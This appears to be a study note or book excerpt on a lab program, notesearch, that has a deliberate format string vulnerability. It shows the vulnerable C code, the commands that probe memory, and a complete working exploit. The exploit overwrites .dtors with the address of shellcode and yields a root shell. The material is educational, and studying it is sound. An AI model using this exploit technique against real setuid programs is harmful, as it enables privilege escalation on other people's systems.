In addition to the buffer overflow vulnerability, the notesearch program from Chapter 2 also suffers from a format string vulnerability, marked below:
__________________________________________________________________________________
int print_notes(int fd, int uid, char *searchstring) {
    int note_length;
    char byte=0, note_buffer[100];
    
    note_length = find_user_note(fd, uid);
    if(note_length == -1) // If end of file reached,
        return 0;             // return 0.
    
    read(fd, note_buffer, note_length); // Read note data.
    note_buffer[note_length] = 0;       // Terminate the string.
    
    if(search_note(note_buffer, searchstring)) // If searchstring found,
        -=*=--=*=--=*=--=*=--=*=-
        printf(note_buffer);                       // print the note.
        -=*=--=*=--=*=--=*=--=*=-
    return 1;
}
__________________________________________________________________________________

This function reads the note_buffer from the file and prints the contents of the note without supplying its own format string
While this buffer can't be directly controlled from the command line, the vulnerability can be exploited by sending exactly the right data to the file using the notetaker program and then opening that note using the notesearch program
In the following output, the notetaker program is used to create notes to probe memory in the notesearch program
This tells us that the eighth function parameter is at the beginning of the buffer
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./notetaker AAAA$(perl -e 'print "%x."x10')
[DEBUG] buffer
 @ 0x804a008: 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.

reader@hacking:~/booksrc $ ./notesearch AAAA
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
AAAAbffff750.23.20435455.37303032.0.0.1.41414141.252e7825.78252e78 .
-------[ end of note data ]-------

reader@hacking:~/booksrc $ ./notetaker BBBB%8\$x
[DEBUG] buffer
 @ 0x804a008: 'BBBB%8$x'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.

reader@hacking:~/booksrc $ ./notesearch BBBB
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
BBBB42424242
-------[ end of note data ]-------
__________________________________________________________________________________

Now that the relative layout of memory is known, exploitation is just a matter of overwriting the .dtors section with the address of injected shellcode
__________________________________________________________________________________
reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)

reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9e8

reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf9e8 - 0xbfff
$2 = 14825
(gdb) quit

reader@hacking:~/booksrc $ nm ./notesearch | grep DTOR
08049c60 d __DTOR_END__
08049c5c d __DTOR_LIST__

reader@hacking:~/booksrc $ ./notetaker $(printf "\x62\x9c\x04\x08\x60\x9c\x04\
x08")%49143x%8\$hn%14825x%9\$hn
[DEBUG] buffer
 @ 0x804a008: 'b?`?%49143x%8$hn%14825x%9$hn'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.

reader@hacking:~/booksrc $ ./notesearch 49143x
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
sh-3.2# whoami
root
sh-3.2#
21
__________________________________________________________________________________


What happened is that we found a format string vulnerability in the notesearch program
As the notesearch doesn't take input from the user, we supply it the data with notetkaer program
So, when we run notesearch to search for the similar text as the format parameter exploit, the exploit runs
Since the .dtors begins at 0x8049c5c and ends with a NULL pointer at 0x8049c60, we overwrite the .dtors end(0x8049c60) with the address of the shellcode in the environement variable so that it gets executed before the main() function exits
We overwrite the .dtors end with 2 writes of short writes and direct parameter access